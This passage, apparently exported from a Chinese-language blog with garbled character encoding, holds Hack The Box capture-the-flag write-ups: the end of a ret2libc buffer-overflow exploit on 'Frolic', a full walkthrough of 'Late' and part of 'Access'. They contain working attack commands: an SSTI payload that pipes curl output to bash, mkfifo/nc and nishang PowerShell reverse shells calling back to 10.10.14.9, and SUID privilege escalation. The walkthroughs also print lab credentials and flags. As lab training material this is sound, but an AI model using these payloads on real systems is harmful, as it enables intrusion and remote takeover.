hello\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100\nAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\n```\nä½¿ç”¨ metasploit çš„ pattern ç”Ÿæˆä¸€ä¸ª 100 å­—ç¬¦çš„ä¸é‡å¤å­—æ®µ\n\n```bash\ngdb-peda$ r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\nStarting program: /root/Desktop/rop Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\n\nProgram received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x64 ('d')\nEBX: 0xffffd0f0 --> 0x2 \nECX: 0xf7fa7000 --> 0x1ead6c \nEDX: 0x0 \nESI: 0x2 \nEDI: 0x80483a0 (<_start>:       xor    ebp,ebp)\nEBP: 0x41366241 ('Ab6A')\nESP: 0xffffd0c0 (\"8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\nEIP: 0x62413762 ('b7Ab')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x62413762\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd0c0 (\"8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0004| 0xffffd0c4 (\"Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0008| 0xffffd0c8 (\"c1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0012| 0xffffd0cc (\"2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0016| 0xffffd0d0 (\"Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0020| 0xffffd0d4 (\"c5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0024| 0xffffd0d8 (\"6Ac7Ac8Ac9Ad0Ad1Ad2A\")\n0028| 0xffffd0dc (\"Ac8Ac9Ad0Ad1Ad2A\")\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x62413762 in ?? ()\n```\nç¡®å®æ˜¯æœ‰ç¼“å†²åŒºæº¢å‡º\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x62413762\n[*] Exact match at offset 52\n```\nåœ¨ç¬¬ 52 ä¸ªå­—ç¬¦æº¢å‡ºäº†\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# python -c 'print \"A\"*52'                                                                        \nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n```\nä½¿ç”¨ python è¾“å‡º 52 ä¸ªAï¼Œç„¶ååœ¨åé¢å†åŠ ä¸Šæˆ‘ä»¬çš„ POC\n\nç°åœ¨æˆ‘ä»¬éœ€è¦çŸ¥é“ /bin/sh çš„åœ°å€\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ ldd rop\nldd rop\n        linux-gate.so.1 =>  (0xb7fda000)\n        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)\n        /lib/ld-linux.so.2 (0xb7fdb000)\n```\nå¾—åˆ°äº†åœ°å€ 0xb7e19000\n\næŸ¥çœ‹ä¸€ä¸‹ç³»ç»Ÿä½ç½®\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system\n</.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i system          \n   245: 00112f20    68 FUNC    GLOBAL DEFAULT   13 svcerr_systemerr@@GLIBC_2.0\n   627: 0003ada0    55 FUNC    GLOBAL DEFAULT   13 __libc_system@@GLIBC_PRIVATE\n  1457: 0003ada0    55 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.0\n```\næ‹¿åˆ°äº†ç³»ç»Ÿåœ°å€ 0003ada0\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit  \n</.binary$ readelf -s /lib/i386-linux-gnu/libc.so.6 |grep -i exit            \n   112: 0002edc0    39 FUNC    GLOBAL DEFAULT   13 __cxa_at_quick_exit@@GLIBC_2.10\n   141: 0002e9d0    31 FUNC    GLOBAL DEFAULT   13 exit@@GLIBC_2.0\n   450: 0002edf0   197 FUNC    GLOBAL DEFAULT   13 __cxa_thread_atexit_impl@@GLIBC_2.18\n   558: 000b07c8    24 FUNC    GLOBAL DEFAULT   13 _exit@@GLIBC_2.0\n   616: 00115fa0    56 FUNC    GLOBAL DEFAULT   13 svc_exit@@GLIBC_2.0\n   652: 0002eda0    31 FUNC    GLOBAL DEFAULT   13 quick_exit@@GLIBC_2.10\n   876: 0002ebf0    85 FUNC    GLOBAL DEFAULT   13 __cxa_atexit@@GLIBC_2.1.3\n  1046: 0011fb80    52 FUNC    GLOBAL DEFAULT   13 atexit@GLIBC_2.0\n  1394: 001b2204     4 OBJECT  GLOBAL DEFAULT   33 argp_err_exit_status@@GLIBC_2.1\n  1506: 000f3870    58 FUNC    GLOBAL DEFAULT   13 pthread_exit@@GLIBC_2.0\n  1849: 000b07c8    24 FUNC    WEAK   DEFAULT   13 _Exit@@GLIBC_2.1.1\n  2108: 001b2154     4 OBJECT  GLOBAL DEFAULT   33 obstack_exit_failure@@GLIBC_2.0\n  2263: 0002e9f0    78 FUNC    WEAK   DEFAULT   13 on_exit@@GLIBC_2.0\n  2406: 000f4c80     2 FUNC    GLOBAL DEFAULT   13 __cyg_profile_func_exit@@GLIBC_2.2\n```\næ‹¿åˆ°äº† exit çš„åœ°å€ 0002e9d0\n\n```bash\nwww-data@frolic:/home/ayush/.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh\n</.binary$ strings -atx /lib/i386-linux-gnu/libc.so.6 |grep bin/sh           \n 15ba0b /bin/sh\n```\næ‹¿åˆ°äº† /bin/sh çš„åœ°å€ 15ba0b\n\nç„¶åæˆ‘ä»¬å†™ä¸€ä¸ªå°è„šæœ¬\n\n```bash\nimport struct\n\nbuf = \"A\" * 52\nlibc = 0xb7e19000\nsystem = struct.pack('<I', libc + 0x0003ada0)\nexit = struct.pack('<I', libc + 0x0002e9d0)\nbinsh = struct.pack('<I', libc + 0x0015ba0b)\n\npayload = buf + system + exit + binsh\n\nprint payload\n```\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat exploit.py|base64 -w 0\naW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ=\n```\næŠŠè„šæœ¬è½¬æ¢ä¸º base64 ç„¶ååˆ°é¶æœºé‡Œå†è§£ç å‡ºæ¥å­˜å‚¨\n\n```bash\nprint payloadwww-data@frolic:~/html/playsms$ echo -n aW1wb3J0IHN0cnVjdAoKYnVmID0gIkEiICogNTIKbGliYyA9IDB4YjdlMTkwMDAKc3lzdGVtID0gc3RydWN0LnBhY2soJzxJJywgbGliYyArIDB4MDAwM2FkYTApCmV4aXQgPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDAyZTlkMCkKYmluc2ggPSBzdHJ1Y3QucGFjaygnPEknLCBsaWJjICsgMHgwMDE1YmEwYikKCnBheWxvYWQgPSBidWYgKyBzeXN0ZW0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d > exploit.py\n<W0gKyBleGl0ICsgYmluc2gKCnByaW50IHBheWxvYWQ= | base64 -d > exploit.py\n```\nè¾“å‡ºæˆ exploit.py äº†\n\n```bash\n./rop $(python /var/www/html/playsms/exploit.py)\n```\nä½¿ç”¨ rop å»æ‰§è¡Œæˆ‘ä»¬çš„ exploit\n\n```bash\n# whoami&&id\nwhoami&&id\nroot\nuid=0(root) gid=33(www-data) groups=33(www-data)\n```\næˆåŠŸææƒåˆ° root æƒé™\n\n```bash\ncat root.txt\n85d3fdf03f969892538ba9a731826222\n```\næˆåŠŸè·å¾— root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Late - Hackthebox","url":"/2022/04/25/Hackthebox/Easy/Hackthebox-Late/","content":"\n# Hackthebox - Late\n# é¶åœºä¿¡æ¯\n![](Hackthebox-Late/3c0da694-38ec-46aa-b528-8a76ed08d5f8.png)\n\n# é¶åœºç±»å‹\n![](Hackthebox-Late/74e589ab-4eec-40b4-aa8e-26bee14ef804.png)\n\n# ä¿¡æ¯æ”¶é›†\n## Nmap\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.11.156\nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-23 21:42 EDT\nNmap scan report for 10.10.11.156\nHost is up (0.36s latency).\nNot shown: 65533 closed ports\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   2048 02:5e:29:0e:a3:af:4e:72:9d:a4:fe:0d:cb:5d:83:07 (RSA)\n|   256 41:e1:fe:03:a5:c7:97:c4:d5:16:77:f3:41:0c:e9:fb (ECDSA)\n|_  256 28:39:46:98:17:1e:46:1a:1e:a1:ab:3b:9a:57:70:48 (ED25519)\n80/tcp open  http    nginx 1.14.0 (Ubuntu)\n|_http-title: Late - Best online image tools\nAggressive OS guesses: Linux 5.4 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 4.15 - 5.6 (93%), Linux 3.10 (92%), Linux 5.3 - 5.4 (92%), Linux 2.6.32 (92%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 443/tcp)\nHOP RTT       ADDRESS\n1   385.69 ms 10.10.14.1\n2   385.83 ms 10.10.11.156\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 60.86 seconds\n```\n## Http\n![](Hackthebox-Late/33b2f7ae-8b61-466d-a254-1c1fcb198b4a.png)\n\nè¿™ä¼¼ä¹æ˜¯ä¸€ä¸ªå›¾åƒç¼–è¾‘å™¨çš„ç½‘ç«™ï¼Œåˆ°å¤„çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆçº¿ç´¢\n\n![](Hackthebox-Late/ed3c5988-f75b-4f0a-861e-b020b5178288.png)\n\nåœ¨è¿™é‡Œæ‰¾åˆ°ä¸€ä¸ªé“¾æ¥\n\n[http://images.late.htb/](http://images.late.htb/)\n\næˆ‘ä»¬å»åŠ å…¥ä¸€ä¸ª hosts\n\n```bash\necho 10.10.11.156 late.htb images.late.htb >> /etc/hosts\n```\nç„¶åå†è®¿é—®ä¸€ä¸‹\n\n![](Hackthebox-Late/ffec8f85-e280-4579-a205-d2b4eefbd141.png)\n\nè¿™é‡Œä¼¼ä¹æ˜¯ä¸Šä¼ å›¾ç‰‡ï¼Œç„¶åä¼šæ‰«æå›¾ç‰‡ï¼Œå…ˆéšä¾¿ä¼ ä¸€ä¸ªè¯•è¯•çœ‹\n\n![](Hackthebox-Late/6b9f01c5-52e6-4923-b9a8-655ec090ba70.jpeg)\n\næˆ‘å°†ä¸Šé¢è¿™å¼ çº¯é»‘è‰²çš„å›¾ç‰‡ä¸Šä¼ ä¸Šå»æäº¤ä»¥åï¼Œç»™äº†æˆ‘ä¸€ä¸ªæ–‡ä»¶ results.txt\n\n```bash\n<p></p>\n```\næˆ‘ä¸å¤ªç†è§£æ˜¯åšäº†ä»€ä¹ˆï¼Œä¹‹åå»æœç´¢äº†ä¸€ä¸‹\n\n![](Hackthebox-Late/7f0b3c3a-7379-47c1-9ffe-077ba415195d.png)\n\n> [https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/](https://www.geeksforgeeks.org/python-convert-image-to-text-and-then-to-speech/)\n\nä¼¼ä¹æ„æ€æ˜¯ä¼šæŠŠå›¾ç‰‡é‡Œçš„æ–‡å­—ä½¿ç”¨OCRè¯†åˆ«ï¼Œç„¶åè¾“å‡ºå‡ºæ¥ï¼Œä¸Šä¼ ä¸€å¼ å¸¦æ–‡å­—çš„å›¾ç‰‡è¯•è¯•\n\n![](Hackthebox-Late/c7b76aaa-50b6-449b-b28d-5580284876cb.png)\n\nå»ä¸Šä¼ ä¸€ä¸‹\n\n```bash\n<p>This is the first line of\nthis text example.\n\nThis is the second line\nof the same text.\n</p>\n```\næœç„¶å¦‚æ­¤ï¼Œå»å°è¯•ä¸€ä¸‹ä¸Šä¼ ä¸€äº›æ¶æ„æ–‡ä»¶è¯•è¯•\n\n```bash\n<p>whoami\n</p>\n```\næˆ‘ä¸Šä¼ äº†ä¸€å¼ å¸¦æœ‰ whoami çš„å›¾ç‰‡ï¼Œè¯†åˆ«å‡ºæ¥åæ²¡æœ‰æ‰§è¡Œï¼Œå’±ä»¬è¯•è¯•æŠŠ  æ ‡ç­¾ç»™é—­ç¯è¯•è¯•\n\n```bash\n<p></p>whoami<p>\n</p>\n```\né—­ç¯å¤±è´¥ï¼Œé‡æ–°æ„é€ ä¸€ä¸‹å…¶ä»–è¯­å¥\n\næˆ‘ä»¬å°è¯•ä¸€ä¸‹ SSTI\n\n![](Hackthebox-Late/cd982019-506e-44c8-a419-bc43116c027e.png)\n\n```bash\n<p>S81\n</p>\n```\nå¾—åˆ°äº†æ­£ç¡®ç­”æ¡ˆ\n\n# æ¼æ´åˆ©ç”¨\né‚£å°è¯•æ„é€ ä¸€ä¸‹æ˜¯å¦å¯ä»¥æ‰§è¡Œå‘½ä»¤\n\n```bash\n${{request.application._ _globals_ _._ _builtins_ _._ _import_ _(\"os\").popen(\"whoami\").read()}}\n```\n![](Hackthebox-Late/c3ba63ca-08aa-46f9-b971-560bfce4366f.png)\n\n```bash\n<p>$svc_acc\n\n</p>\n```\næ‰§è¡ŒæˆåŠŸï¼Œè¿™ä¸ª OCR è¯†åˆ«çš„æ¡ä»¶éå¸¸è‹›åˆ»ï¼Œæˆ‘å°è¯•äº†å¾ˆå¤šå¾ˆå¤šå­—ä½“ï¼Œæ€»ç®—æˆäº†ä¸€ä¸ª\n\næƒ³åŠæ³•æ¥åšä¸€ä¸ªåå¼¹ Shell çš„ payload\n\né¦–å…ˆæˆ‘ä»¬ç”Ÿæˆæˆ‘ä»¬è¦çš„å›¾ç‰‡\n\n```bash\n${{request.application.__globals__.__builtins__.__import__(\"os\").popen(\"curl http://10.10.14.9/payload | bash\").read()}}\n```\n![](Hackthebox-Late/4601fbb3-4f55-47fe-a279-ec066bf4d0d4.png)\n\næ¥ç€åœ¨æ¡Œé¢åˆ›å»ºä¸€ä¸ª payload æ–‡ä»¶ï¼Œå†…å®¹ä¸º\n\n```bash\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.9 4444 >/tmp/f\n```\næ¥ç€å’±ä»¬éœ€è¦å¼€ä¸¤ä¸ªå‘½ä»¤çª—å£\n\nCommand 1\n\n```bash\npython3 -m http.server 80\n```\nCommand 2\n\n```bash\nnc -nvlp 4444\n```\nç„¶åä¸Šä¼ æˆ‘ä»¬çš„ Payload\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nc -nvlp 4444                                       \nlistening on [any] 4444 ...\nconnect to [10.10.14.9] from (UNKNOWN) [10.10.11.156] 58240\nbash: cannot set terminal process group (1213): Inappropriate ioctl for device\nbash: no job control in this shell\nsvc_acc@late:~/app$ whoami&&id\nwhoami&&id\nsvc_acc\nuid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ shell\n\n```bash\nsvc_acc@late:~$ cat user.txt\ncat user.txt\naf80a52c1f6ce51724a56a589a96ce20\n```\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\né¦–å…ˆè¿è¡Œä¸€ä¸‹ pspy\n\n> [https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy)\n\n![](Hackthebox-Late/91c6fc8a-2215-43f1-ba34-bed4480ea2f5.png)\n\nè¿™é‡Œæ‰¾åˆ°äº†ä¸€ä¸ªå®šæ—¶ä»»åŠ¡è„šæœ¬\n\n```bash\n/usr/local/sbin/ssh-alert.sh\n```\n```bash\n#!/bin/bash\n\nRECIPIENT=\"root@late.htb\"\nSUBJECT=\"Email from Server Login: SSH Alert\"\n\nBODY=\"\nA SSH login was detected.\n\n        User:        $PAM_USER\n        User IP Host: $PAM_RHOST\n        Service:     $PAM_SERVICE\n        TTY:         $PAM_TTY\n        Date:        `date`\n        Server:      `uname -a`\n\"\n\nif [ ${PAM_TYPE} = \"open_session\" ]; then\n        echo \"Subject:${SUBJECT} ${BODY}\" | /usr/sbin/sendmail ${RECIPIENT}\nfi\n```\nè¿™æ˜¯è„šæœ¬çš„å†…å®¹ï¼Œå’±ä»¬åˆ†æä¸€ä¸‹\n\n```bash\nsvc_acc@late:~$ ls -la /usr/local/sbin/ssh-alert.sh\n-rwxr-xr-x 1 svc_acc svc_acc 433 Apr 24 07:16 /usr/local/sbin/ssh-alert.sh\nsvc_acc@late:~$ lsattr /usr/local/sbin/ssh-alert.sh\n-----a--------e--- /usr/local/sbin/ssh-alert.sh\n```\nè¿™é‡ŒæŸ¥çœ‹æƒé™ï¼Œå’±ä»¬æ˜¯å¯ä»¥å°†å†…å®¹å†™åˆ°è¿›å»çš„\n\n```bash\necho \"chmod u+s /bin/bash\" >> /usr/local/sbin/ssh-alert.sh\n```\nå’±ä»¬åŠ ä¸€ä¸ª bash SUIDï¼Œç„¶åé‡æ–°ç™»å½• sshï¼Œæ¥ç€æ‰§è¡Œææƒå‘½ä»¤\n\n```bash\nsvc_acc@late:~$ echo \"chmod u+s /bin/bash\" >> /usr/local/sbin/ssh-alert.sh\nsvc_acc@late:~$ exit\nlogout\nConnection to 10.10.11.156 closed.\n\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ssh svc_acc@10.10.11.156 -i id_rsa\n-bash-4.4$ id\nuid=1000(svc_acc) gid=1000(svc_acc) groups=1000(svc_acc)\n-bash-4.4$ bash -p\nbash-4.4# id\nuid=1000(svc_acc) gid=1000(svc_acc) euid=0(root) groups=1000(svc_acc)\n```\næˆåŠŸæ‹¿åˆ° root æƒé™\n\n```bash\nbash-4.4# cat /root/root.txt \n7af076bfa316a1091b3139a231ac7d1e\n```\næˆåŠŸæ‹¿åˆ° root æƒé™çš„ flag æ–‡ä»¶","tags":["Hackthebox"]},{"title":"Access - Hackthebox","url":"/2022/04/24/Hackthebox/Hackthebox-Access/","content":"\n# Hackthebox - Access\n\n# é¶åœºä¿¡æ¯\n\n![](Hackthebox-Access/c3023160-dbeb-4968-bb82-dc3dbb973934.png)\n\n# é¶åœºç±»å‹\n\n![](Hackthebox-Access/a47fb898-9304-46fb-87e6-6e87090a8865.png)\n\n# ä¿¡æ¯æ”¶é›†\n\n## Nmap\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.98 \nStarting Nmap 7.91 ( https://nmap.org ) at 2022-04-24 22:29 EDT\nNmap scan report for 10.10.10.98\nHost is up (0.34s latency).\nNot shown: 65532 filtered ports\nPORT   STATE SERVICE VERSION\n21/tcp open  ftp     Microsoft ftpd\n| ftp-syst: \n|_  SYST: Windows_NT\n23/tcp open  telnet?\n80/tcp open  http    Microsoft IIS httpd 7.5\n| http-methods: \n|_  Potentially risky methods: TRACE\n|_http-server-header: Microsoft-IIS/7.5\n|_http-title: MegaCorp\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose|phone|specialized\nRunning (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)\nOS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012\nAggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nTRACEROUTE (using port 23/tcp)\nHOP RTT       ADDRESS\n1   338.15 ms 10.10.14.1\n2   338.30 ms 10.10.10.98\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 89.52 seconds\n```\n\nè¿™é‡Œæœ‰ä¸ª ftpï¼Œä½¿ç”¨åŒ¿åç”¨æˆ·æŸ¥çœ‹\n\n## FTP\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ftp 10.10.10.98                                                                                                         \nConnected to 10.10.10.98.\n220 Microsoft FTP Service\nName (10.10.10.98:root): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:\n230 User logged in.\nRemote system type is Windows_NT.\n```\n\nç™»å…¥åæœ‰ä¸¤ä¸ªæ–‡ä»¶å¤¹\n\n```bash\nftp> ls\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM       <DIR>          Backups\n08-24-18  10:00PM       <DIR>          Engineer\n226 Transfer complete.\n```\n\nBackups å’Œ Engineer é‡Œåˆ†åˆ«æœ‰ä¸€ä¸ªæ–‡ä»¶\n\n```bash\nftp> ls backups\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-23-18  09:16PM              5652480 backup.mdb\n226 Transfer complete.\n```\n\n```bash\nftp> ls engineer\n200 PORT command successful.\n125 Data connection already open; Transfer starting.\n08-24-18  01:16AM                10870 Access Control.zip\n226 Transfer complete.\n```\n\nä½¿ç”¨ get ç»™å®ƒä¸‹è½½ä¸‹æ¥ï¼Œbackup.mdb æ¯”è¾ƒå¤§ï¼Œå¤šç­‰å¾…ä¸€ä¸‹\n\nå»æŸ¥çœ‹ä¸€ä¸‹ backup.mdb çš„æ–‡ä»¶\n\n# æ¼æ´åˆ©ç”¨\n\n## Zip\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# strings backup.mdb|grep access\naccess4u@security\n```\n\næˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç ï¼Œåº”è¯¥æ˜¯è§£å‹å¯†ç ï¼Œå»å°è¯•è§£å‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ls Access\\ Control.pst                                                              2 â¨¯\n'Access Control.pst'\n```\n\nè§£å‹æˆåŠŸ\n\n## PST\n\nä½¿ç”¨ readpst æ¥æå–æ–‡ä»¶\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# readpst Access\\ Control.pst \nOpening PST file and indexes...\nProcessing Folder \"Deleted Items\"\n        \"Access Control\" - 2 items done, 0 items skipped.\n```\n\nç„¶åæŸ¥çœ‹ä¸€ä¸‹\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat Access\\ Control.mbox\n\nThe password for the â€œsecurityâ€ account has been changed to 4Cc3ssC0ntr0ller.  Please ensure this is passed on to your engineers.\n```\n\nåœ¨é‡Œé¢æ‰¾åˆ°ä¸€ä¸ªå¯†ç \n\n```bash\nusername = security\npassword = 4Cc3ssC0ntr0ller\n```\n\nå»å°è¯•ç™»å½• 23 ç«¯å£\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# telnet 10.10.10.98                                \nTrying 10.10.10.98...\nConnected to 10.10.10.98.\nEscape character is '^]'.\nWelcome to Microsoft Telnet Service \n\nlogin: security\npassword: \n\n*===============================================================\nMicrosoft Telnet Server.\n*===============================================================\nC:\\Users\\security>whoami\naccess\\security\n```\n\næˆåŠŸæ‹¿åˆ°ä¸€ä¸ª user æƒé™çš„ shell\n\n```bash\nC:\\Users\\security\\Desktop>type user.txt\nff1f3b48913b213a31ff6756d2553d38\n```\n\næˆåŠŸå¾—åˆ°ä¸€ä¸ª user æƒé™çš„ flag æ–‡ä»¶\n\n# æƒé™æå‡\n\n```bash\nC:\\Users\\security>powershell whoami\naccess\\security\n```\n\nç¡®è®¤ powershell å­˜åœ¨å¹¶å¯æ‰§è¡Œå‘½ä»¤\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cp /opt/shells/Invoke-PowerShellTcp.ps1 nishang.ps1\n```\n\næˆ‘ä»¬ä½¿ç”¨ nishang æ¥è¿›è¡Œææƒ\n\nä½¿ç”¨ python3 å¼€å¯ä¸€ä¸ª http æœåŠ¡\n\n```bash\npython3 -m http.server 80\n```\n\n```bash\nInvoke-PowerShellTcp -Reverse -IPAddress 10.10.14.9 -Port 4444\n```\n\nå°†ä¸Šé¢è¿™å¥ä»£ç æ·»åŠ åˆ° nishang æœ€åä¸€è¡Œï¼Œç„¶åä½¿ç”¨ nc ç›‘å¬ä¸€ä¸ªç«¯å£\n\n```bash\nnc -nvlp 4444\n```\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/nishang.ps1')\"\n```\n\nç„¶åæ‰§è¡Œ\n\n```bash\nPS C:\\Users\\security>whoami\naccess\\security\n```\n\nç°åœ¨æˆ‘ä»¬å¾—åˆ°äº†ä¸€ä¸ªäº¤äº’å¼ shell äº†ï¼Œå…¶å®è¿™ä¸€æ­¥å¯ä»¥ä¸åšï¼Œä¸è¿‡æˆ‘å–œæ¬¢åœ¨ shell å†…è¾“å…¥å‘½ä»¤ï¼Œè€Œä¸èƒ½ä½¿ç”¨åˆ é™¤é”®å°±å¾ˆéš¾å—\n\n> [https://github.com/411Hall/JAWS](https://github.com/411Hall/JAWS)\n\næ¥ç€æˆ‘ä»¬ä½¿ç”¨ JAWS æ¥è¿›è¡Œæšä¸¾\n\n```bash\npowershell \"IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.9/jaws-enum.ps1')\"\n```\n\n```bash\ncmd.exe                   764 security /q /k C:\\Windows\\system32\\login.cmd\n```\n\nè¿™é‡Œçœ‹åˆ°äº†ä¸€ä¸ªæœ‰è¶£çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬å¯ä»¥å»çœ‹çœ‹è¿™æ˜¯ä»€ä¹ˆ\n\n```bash\nC:\\Users\\security>type C:\\Windows\\system32\\login.cmd\n@echo off\nrem\nrem  Default global login script for the Telnet Server\nrem\nrem  In the default setup, this command script is executed when the\nrem  initial command shell is invoked.  It, in turn, will try to invoke\nrem  the individual user's login script.\nrem\n\necho *===============================================================\necho Microsoft Telnet Server.\necho *===============================================================\n\ncd /d %HOMEDRIVE%\\%HOMEPATH%\n```\n\nè¿™æ˜¯è„šæœ¬çš„å†…å®¹\n\n```bash\nC:\\Users\\security>cmdkey /list\n\nCurrently stored credentials:\n\n    Target: Domain:interactive=ACCESS\\Administrator\n                                                       Type: Domain Password\n    User: ACCESS\\Administrator\n```\n\nä½¿ç”¨ cmdkey /list 